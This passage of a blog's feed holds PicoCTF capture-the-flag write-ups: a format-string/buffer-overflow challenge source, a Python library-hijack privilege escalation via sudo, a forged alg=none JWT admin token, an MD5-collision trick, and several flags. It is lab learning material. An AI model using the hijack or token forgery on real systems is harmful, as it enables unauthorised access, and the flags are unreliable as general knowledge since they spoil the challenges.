&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Guessing Game 2</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---guessing-game-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---guessing-game-2/</guid><description>&lt;h1 id="picoctf---guessing-game-2">
 PicoCTF - Guessing Game 2
 &lt;a class="anchor" href="#picoctf---guessing-game-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>fmt / leak libc / ret2libc / leak canary&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;

#define BUFSIZE 512


long get_random() {
	return rand;
}

int get_version() {
	return 2;
}

// void print(long n)
// {
// // If number is smaller than 0, put a - sign
// // and change number to positive
// if (n &amp;lt; 0) {
// putchar(&amp;#39;-&amp;#39;);
// n = -n;
// }
 
// // Remove the last digit and recur
// if (n/10)
// print(n/10);
 
// // Print the last digit
// putchar(n%10 + &amp;#39;0&amp;#39;);
// }

int do_stuff() {
	long ans = (get_random() % 4096) + 1;
	// print(ans);
	int res = 0;
	
	printf(&amp;#34;What number would you like to guess?\n&amp;#34;);
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf(&amp;#34;That&amp;#39;s not a valid number!\n&amp;#34;);
	} else {
		if (g == ans) {
			printf(&amp;#34;Congrats! You win! Your prize is this print statement!\n\n&amp;#34;);
			res = 1;
		} else {
			printf(&amp;#34;Nope!\n\n&amp;#34;);
		}
	}
	return res;
}

void win() {
	char winner[BUFSIZE];
	printf(&amp;#34;New winner!\nName? &amp;#34;);
	gets(winner);
	printf(&amp;#34;Congrats: &amp;#34;);
	printf(winner);
	printf(&amp;#34;\n\n&amp;#34;);
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	
	int res;
	
	printf(&amp;#34;Welcome to my guessing game!\n&amp;#34;);
	printf(&amp;#34;Version: %x\n\n&amp;#34;, get_version());
	
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	
	return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - hijacking</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---hijacking/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---hijacking/</guid><description>&lt;h1 id="picoctf---hijacking">
 PicoCTF - hijacking
 &lt;a class="anchor" href="#picoctf---hijacking">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Privilege Escalation&lt;/p>
&lt;p>Hint 1: Check for Hidden files
Hint 2: No place like Home:)&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://www.runoob.com/linux/linux-comm-sudo.html">Linux sudo命令&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>-l 顯示出自己（執行 sudo 的使用者）的權限&lt;/p>&lt;/blockquote>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>第一次遇到提權的問題，感覺很新鮮也很好玩，不過因為沒啥概念所以主要是參考&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;/p>
&lt;ol>
&lt;li>首先觀察一下各個file或folders，根目錄有個challenge folder，另外家目錄有一個.server.py檔案，裡面的內容不太重要，只需要知道他import哪些library&lt;/li>
&lt;li>現在的問題是按照目前的權限，無法讀取challenge相關的資訊，所以我們要提升權限，主要的做法是利用base64.py這個mod全開的檔案進行讀寫，再利用python執行有import base64的.server.py檔案就可以執行shell&lt;/li>
&lt;li>為神麼要用base64.py當作主要的突破口就是因為只有他的mod全開
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ls -al /usr/lib/python3.8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rwxrwxrwx &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">20382&lt;/span> Nov &lt;span style="color:#ae81ff">14&lt;/span> &lt;span style="color:#ae81ff">2022&lt;/span> base64.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">38995&lt;/span> Nov &lt;span style="color:#ae81ff">14&lt;/span> &lt;span style="color:#ae81ff">2022&lt;/span> os.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">35243&lt;/span> Nov &lt;span style="color:#ae81ff">14&lt;/span> &lt;span style="color:#ae81ff">2022&lt;/span> socket.py
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ssh picoctf@saturn.picoctf.net -p &lt;span style="color:#ae81ff">58219&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ find / -name &lt;span style="color:#e6db74">&amp;#34;base64.py&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/lib/python3.8/base64.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ vim /usr/lib/python3.8/base64.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># add these line and save the file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>import os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>os.system&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;ls -al /challenge&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo -l
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Matching Defaults entries &lt;span style="color:#66d9ef">for&lt;/span> picoctf on challenge:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> env_reset, mail_badpass,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> secure_path&lt;span style="color:#f92672">=&lt;/span>/usr/local/sbin&lt;span style="color:#ae81ff">\:&lt;/span>/usr/local/bin&lt;span style="color:#ae81ff">\:&lt;/span>/usr/sbin&lt;span style="color:#ae81ff">\:&lt;/span>/usr/bin&lt;span style="color:#ae81ff">\:&lt;/span>/sbin&lt;span style="color:#ae81ff">\:&lt;/span>/bin&lt;span style="color:#ae81ff">\:&lt;/span>/snap/bin
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User picoctf may run the following commands on challenge:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>ALL&lt;span style="color:#f92672">)&lt;/span> /usr/bin/vi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>root&lt;span style="color:#f92672">)&lt;/span> NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo /usr/bin/python3 /home/picoctf/.server.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>total &lt;span style="color:#ae81ff">4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>d--------- &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">6&lt;/span> Mar &lt;span style="color:#ae81ff">16&lt;/span> 02:08 .
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>drwxr-xr-x &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">51&lt;/span> Jul &lt;span style="color:#ae81ff">31&lt;/span> 15:23 ..
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">103&lt;/span> Mar &lt;span style="color:#ae81ff">16&lt;/span> 02:08 metadata.json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sh: 1: ping: not found
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Traceback &lt;span style="color:#f92672">(&lt;/span>most recent call last&lt;span style="color:#f92672">)&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> File &lt;span style="color:#e6db74">&amp;#34;/home/picoctf/.server.py&amp;#34;&lt;/span>, line 7, in &amp;lt;module&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> host_info &lt;span style="color:#f92672">=&lt;/span> socket.gethostbyaddr&lt;span style="color:#f92672">(&lt;/span>ip&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>socket.gaierror: &lt;span style="color:#f92672">[&lt;/span>Errno -5&lt;span style="color:#f92672">]&lt;/span> No address associated with hostname
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ vim /usr/lib/python3.8/base64.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># revise the file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>os.system&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;cat /challegne/metadata.json&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo /usr/bin/python3 /home/picoctf/.server.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;flag&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;username&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;picoctf&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;password&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;HYGhWsmPyf&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>sh: 1: ping: not found
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Traceback &lt;span style="color:#f92672">(&lt;/span>most recent call last&lt;span style="color:#f92672">)&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> File &lt;span style="color:#e6db74">&amp;#34;/home/picoctf/.server.py&amp;#34;&lt;/span>, line 7, in &amp;lt;module&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> host_info &lt;span style="color:#f92672">=&lt;/span> socket.gethostbyaddr&lt;span style="color:#f92672">(&lt;/span>ip&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>socket.gaierror: &lt;span style="color:#f92672">[&lt;/span>Errno -5&lt;span style="color:#f92672">]&lt;/span> No address associated with hostname
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Flag: &lt;code>picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - information</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/picoctf---information/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/picoctf---information/</guid><description>&lt;h1 id="picoctf---information">
 PicoCTF - information
 &lt;a class="anchor" href="#picoctf---information">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/186?category=4&amp;amp;page=1">https://play.picoctf.org/practice/challenge/186?category=4&amp;page=1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ubunlog.com/zh-TW/exiftool-manipula-metadatos-ubuntu/">ExifTool&lt;/a>&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ exiftool cat.jpg
ExifTool Version Number : 11.88
File Name : cat.jpg
Directory : .
File Size : 858 kB
File Modification Date/Time : 2023:02:16 02:15:29+08:00
File Access Date/Time : 2023:02:16 16:09:51+08:00
File Inode Change Date/Time : 2023:02:16 12:31:32+08:00
File Permissions : rwxrwxrwx
File Type : JPEG
File Type Extension : jpg
MIME Type : image/jpeg
JFIF Version : 1.02
Resolution Unit : None
X Resolution : 1
Y Resolution : 1
Current IPTC Digest : 7a78f3d9cfb1ce42ab5a3aa30573d617
Copyright Notice : PicoCTF
Application Record Version : 4
XMP Toolkit : Image::ExifTool 10.80
License : cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9
Rights : PicoCTF
Image Width : 2560
Image Height : 1598
Encoding Process : Baseline DCT, Huffman coding
Bits Per Sample : 8
Color Components : 3
Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2)
Image Size : 2560x1598
Megapixels : 4.1
&lt;/code>&lt;/pre>&lt;p>In License row, it&amp;rsquo;s obviously a base64 encoding string
&lt;code>picoCTF{the_m3tadata_1s_modified}&lt;/code>&lt;/p></description></item><item><title>PicoCTF - Insp3ct0r</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---insp3ct0r/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---insp3ct0r/</guid><description>&lt;h1 id="picoctf---insp3ct0r">
 PicoCTF - Insp3ct0r
 &lt;a class="anchor" href="#picoctf---insp3ct0r">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://jupiter.challenges.picoctf.org:9670/">Insp3ct0r&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h2 id="exploit---browser-inspector">
 Exploit - Browser Inspector
 &lt;a class="anchor" href="#exploit---browser-inspector">#&lt;/a>
&lt;/h2>
&lt;p>HTML&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-html!" data-lang="html!">&amp;lt;!doctype html&amp;gt;
&amp;lt;html&amp;gt;
 &amp;lt;head&amp;gt;
 &amp;lt;title&amp;gt;My First Website :)&amp;lt;/title&amp;gt;
 &amp;lt;link href=&amp;#34;https://fonts.googleapis.com/css?family=Open+Sans|Roboto&amp;#34; rel=&amp;#34;stylesheet&amp;#34;&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;mycss.css&amp;#34;&amp;gt;
 &amp;lt;script type=&amp;#34;application/javascript&amp;#34; src=&amp;#34;myjs.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
 &amp;lt;/head&amp;gt;

 &amp;lt;body&amp;gt;
 &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
 &amp;lt;header&amp;gt;
	&amp;lt;h1&amp;gt;Inspect Me&amp;lt;/h1&amp;gt;
 &amp;lt;/header&amp;gt;

 &amp;lt;button class=&amp;#34;tablink&amp;#34; onclick=&amp;#34;openTab(&amp;#39;tabintro&amp;#39;, this, &amp;#39;#222&amp;#39;)&amp;#34; id=&amp;#34;defaultOpen&amp;#34;&amp;gt;What&amp;lt;/button&amp;gt;
 &amp;lt;button class=&amp;#34;tablink&amp;#34; onclick=&amp;#34;openTab(&amp;#39;tababout&amp;#39;, this, &amp;#39;#222&amp;#39;)&amp;#34;&amp;gt;How&amp;lt;/button&amp;gt;
 
 &amp;lt;div id=&amp;#34;tabintro&amp;#34; class=&amp;#34;tabcontent&amp;#34;&amp;gt;
	&amp;lt;h3&amp;gt;What&amp;lt;/h3&amp;gt;
	&amp;lt;p&amp;gt;I made a website&amp;lt;/p&amp;gt;
 &amp;lt;/div&amp;gt;

 &amp;lt;div id=&amp;#34;tababout&amp;#34; class=&amp;#34;tabcontent&amp;#34;&amp;gt;
	&amp;lt;h3&amp;gt;How&amp;lt;/h3&amp;gt;
	&amp;lt;p&amp;gt;I used these to make this site: &amp;lt;br/&amp;gt;
	 HTML &amp;lt;br/&amp;gt;
	 CSS &amp;lt;br/&amp;gt;
	 JS (JavaScript)
	&amp;lt;/p&amp;gt;
	&amp;lt;!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 --&amp;gt;
 &amp;lt;/div&amp;gt;
 
 &amp;lt;/div&amp;gt;
 
 &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>CSS
Download it and search specific string&lt;/p></description></item><item><title>PicoCTF - Investigative Reversing 0</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---investigative-reversing-0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/general/picoctf---investigative-reversing-0/</guid><description>&lt;h1 id="picoctf---investigative-reversing-0">
 PicoCTF - Investigative Reversing 0
 &lt;a class="anchor" href="#picoctf---investigative-reversing-0">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/70?category=4&amp;amp;page=3">Investigative Reversing 0&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="http://tw.gitbook.net/c_standard_library/c_function_fputc.html">fputc() - C語言庫函數&lt;/a>
&lt;a href="https://shengyu7697.github.io/cpp-fread/">C/C++ fread 用法與範例&lt;/a>
&lt;a href="https://blog.51cto.com/u_6680689/3260951">C中fread()函数的返回值&lt;/a>
&lt;a href="https://blog.csdn.net/u010164190/article/details/124945191">C语言之1ULL/1UL/1L区别&lt;/a>&lt;/p>
&lt;h2 id="source-code---ida">
 Source code - IDA
 &lt;a class="anchor" href="#source-code---ida">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int __cdecl main(int argc, const char **argv, const char **envp)
{
 int i; // [rsp+4h] [rbp-4Ch]
 int j; // [rsp+8h] [rbp-48h]
 FILE *stream; // [rsp+10h] [rbp-40h]
 FILE *v8; // [rsp+18h] [rbp-38h]
 char ptr[40]; // [rsp+20h] [rbp-30h] BYREF
 unsigned __int64 v10; // [rsp+48h] [rbp-8h]

 v10 = __readfsqword(40u);
 stream = fopen(&amp;#34;flag.txt&amp;#34;, &amp;#34;r&amp;#34;);
 v8 = fopen(&amp;#34;mystery.png&amp;#34;, &amp;#34;a&amp;#34;);
 if ( !stream )
 puts(&amp;#34;No flag found, please make sure this is run on the server&amp;#34;);
 if ( !v8 )
 puts(&amp;#34;mystery.png is missing, please run this on the server&amp;#34;);
 if ( (int)fread(ptr, 26uLL, 1uLL, stream) &amp;lt;= 0 )
 exit(0);
 puts(&amp;#34;at insert&amp;#34;);
 fputc(ptr[0], v8);
 fputc(ptr[1], v8);
 fputc(ptr[2], v8);
 fputc(ptr[3], v8);
 fputc(ptr[4], v8);
 fputc(ptr[5], v8);
 for ( i = 6; i &amp;lt;= 14; ++i )
 fputc((char)(ptr[i] + 5), v8);
 fputc((char)(ptr[15] - 3), v8);
 for ( j = 16; j &amp;lt;= 25; ++j )
 fputc(ptr[j], v8);
 fclose(v8);
 fclose(stream);
 return __readfsqword(40u) ^ v10;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - It is my Birthday</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---it-is-my-birthday/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---it-is-my-birthday/</guid><description>&lt;h1 id="picoctf---it-is-my-birthday">
 PicoCTF - It is my Birthday
 &lt;a class="anchor" href="#picoctf---it-is-my-birthday">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-web">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/109?category=1&amp;amp;page=1">It is my Birthday&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://github.com/corkami/collisions">corkami/collisions&lt;/a>&lt;/p>
&lt;h2 id="exploit---md5-collision">
 Exploit - MD5 Collision
 &lt;a class="anchor" href="#exploit---md5-collision">#&lt;/a>
&lt;/h2>
&lt;p>Try to find different &lt;code>pdf&lt;/code> file that has same &lt;code>MD5&lt;/code> hash
Such as the example provided by &lt;code>corkami&lt;/code> - &lt;a href="https://raw.githubusercontent.com/corkami/collisions/master/examples/poeMD5_A.pdf">poeMD5_A&lt;/a> and &lt;a href="https://raw.githubusercontent.com/corkami/collisions/master/examples/poeMD5_B.pdf">poeMD5_B&lt;/a>
Note that, you must notice the file size you uploaded can not too large.&lt;/p>
&lt;h2 id="source-code---after-exploit">
 Source code - After Exploit
 &lt;a class="anchor" href="#source-code---after-exploit">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler after exploit you can get the source code &amp;amp; flag&lt;/p></description></item><item><title>PicoCTF - It's Not My Fault 1</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---its-not-my-fault-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---its-not-my-fault-1/</guid><description>&lt;h1 id="picoctf---its-not-my-fault-1">
 PicoCTF - It&amp;rsquo;s Not My Fault 1
 &lt;a class="anchor" href="#picoctf---its-not-my-fault-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">#!/usr/bin/python3 -u
import random
import string
import hashlib
import time

from Crypto.Util.number import inverse, getPrime, bytes_to_long, GCD
from sympy.ntheory.modular import solve_congruence

FLAG = open(&amp;#39;flag.txt&amp;#39;, &amp;#39;r&amp;#39;).read()

def CRT(a, m, b, n):
	val, mod = solve_congruence((a, m), (b, n))
	return val

def gen_key():
	while True:
		p = getPrime(512)
		q = getPrime(512)
		if GCD(p-1, q-1) == 2:
			return p, q

def get_clue(p, q, BITS):
	while True:
		d_p = random.randint(1, 1 &amp;lt;&amp;lt; BITS)
		d_q = random.randint(1, q - 1)
		if d_p % 2 == d_q % 2:
			d = CRT(d_p, p - 1, d_q, q - 1)
			e = inverse(d, (p - 1) * (q - 1))
			print(&amp;#34;Clue : &amp;#34;, e)
			return

def get_flag(p, q):
	start = time.time()
	ans = int(input())
	if (time.time() - start) &amp;gt; (15 * 60):
		print(&amp;#34;Too long!&amp;#34;)
		exit()
	else:
		if ans == p + q:
			print(FLAG)
		else:
			print(&amp;#34;oops...&amp;#34;)


#PoW

vals1 = &amp;#34;&amp;#34;.join([random.choice(string.digits) for _ in range(5)])
vals2 = &amp;#34;&amp;#34;.join([random.choice(string.hexdigits.lower()) for _ in range(6)])
user_input = input(&amp;#34;Enter a string that starts with \&amp;#34;{}\&amp;#34; (no quotes) which creates an md5 hash that ends in these six hex digits: {}\n&amp;#34;.format(vals1, vals2))
user_hash = hashlib.md5(user_input.encode()).hexdigest()

if user_input[:5] == vals1 and user_hash[-6:] == vals2:
	p, q = gen_key()
	n = p * q
	print(&amp;#34;Public Modulus : &amp;#34;, n)
	get_clue(p, q, 20)
	get_flag(p, q)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - JAUTH</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jauth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---jauth/</guid><description>&lt;h1 id="picoctf---jauth">
 PicoCTF - JAUTH
 &lt;a class="anchor" href="#picoctf---jauth">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/JO7xByQgQWK67eU0goHMeA?view#c">NTUCNS - HW3 - JWT Authentication&lt;/a>&lt;/p>
&lt;h2 id="exploit---jwr--none">
 Exploit - JWR + None
 &lt;a class="anchor" href="#exploit---jwr--none">#&lt;/a>
&lt;/h2>
&lt;p>其實這一題有一點奇怪，應該說之前在解CNS作業的驗證時，TA說目前應該是不行以Alg=None的形式進行驗證的設計，我以為是後端的框架都不支援了，但應該說是不建議這樣的做法，所以這一題比想像中簡單，我還以為要把公鑰找出來，再進行sign&lt;/p>
&lt;ol>
&lt;li>用類似jwt.io的網站(&lt;a href="https://token.dev/">online tool&lt;/a>)，但支援alg=none的編碼
Payload: &lt;code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjg3NzY0MjM1MTAzLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwOS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzExNC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjg3NzY0MjM1fQ&lt;/code>
&lt;img src="https://hackmd.io/_uploads/B1vcsALOn.png" alt="" />&lt;/li>
&lt;/ol>
&lt;p>Flag: &lt;code>picoCTF{succ3ss_@u7h3nt1c@710n_72bf8bd5}&lt;/code>&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/njsjTVcwGwY"> picoCTF : JAUTH (Challenge 8) &lt;/a>&lt;/p></description></item><item><title>PicoCTF - Java Code Analysis!?!</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-code-analysis_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---java-code-analysis_/</guid><description>&lt;h1 id="picoctf---java-code-analysis">
 PicoCTF - Java Code Analysis!?!
 &lt;a class="anchor" href="#picoctf---java-code-analysis">#&lt;/a>
&lt;/h1>
